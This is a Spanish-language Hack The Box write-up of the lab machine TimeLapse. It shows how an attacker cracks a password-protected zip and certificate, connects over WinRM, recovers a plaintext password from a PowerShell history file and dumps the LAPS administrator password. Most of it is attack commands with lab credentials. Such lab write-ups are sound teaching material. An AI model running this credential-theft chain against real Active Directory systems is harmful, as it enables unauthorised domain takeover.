---
title: TimeLapse hackthebox writeup
author: HackerCloud
date: 2022-08-31 00:00:00 +0800
categories: [Hackthebox, machine, writeup]
tags: [Hackthebox, writeup]
image:
  path: ../../assets/img/commons/timelapse-writeup/Timelapse.png
  width: 800
  height: 500
  alt: Banner TimeLapse
---

Empezamos con el escaneo de puertos sobre la máquina

```ruby
Nmap scan report for 10.10.11.152
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
```

Cómo vemos que está el servicio SMB habilitado vamos a empezar a enumerar

```
❯ smbclient -L 10.10.11.152
Enter WORKGROUP\root's password:
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Shares          Disk  
```

Dentro de Shares/Dev/ hay un archivo zip, podemos descargarlo con smbmap con el parámetro --download o con la consola interactiva de smbclient

El zip tiene una contraseña, la podemos crackear con john

`john --wordlist=/usr/share/wordlists/rockyou.txt hashzip`

Al descomprimir el zip se puede ver un archivo .pfx que se puede usar para extraer un certificado y conectarse a la máquina por winrm


```bash
❯ ls
hashzip legacyy_dev_auth.pfx pfxhash winrm_backup.zip
```

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt pfxhash
thuglegacy    (legacyy_dev_auth.pfx)
```

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.key
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
```

Ahora con los siguientes parámetros nos podemos conectar por evil-winrm
```
-c: certificate
-k key
-S: SSL mode
```

```powershell
❯ evil-winrm -S -i 10.10.11.152 -c crt -k key
Enter PEM pass phrase: thuglegacy
PS C:\Users\legacyy\Desktop> type user.txt
********************************
```

Al ejecutar [WinPeas](https://github.com/carlospolop/PEASS-ng/releases/tag/20220605) podemos ver que hay un archivo de historial que podemos leer, en este tipo de archivos podemos encontrar contraseñas

```
C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt
```

Efectivamente encontramos una contraseña para el usuario svc_deploy, con esto podríamos conectarnos contra la administración remota de windows ya que el usuario pertenece a `remote management users`

```
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
```

El usuario pertenece al grupo LAPS Readers que nos permite algunas cosas interesantes

Podemos usar crackmapexec, LAPSDumper y otras herramientas para intentar crear una contraseña temporal para el usuario Administrator, en este caso voy a usar LAPSDumper 

```bash
 python3 laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb
```

Esto nos devuelve directamente el nombre del DC y su contraseña temporal en texto claro

Con eso ya solo queda conectarnos por winrm con ñas credenciales obtenidas, en este caso tenemos que usar el parámetro `-S` para poner el modo SSL ya que el puerto 5986 tiene wsmans en lugar de wsman

```
❯ evil-winrm -S -i 10.10.11.152 -u Administrator -p 'temporal_password'
PS C:\Users\TRX/Desktop> type root.txt
********************************
```

Y con esto terminamos la máquina TimeLapse.
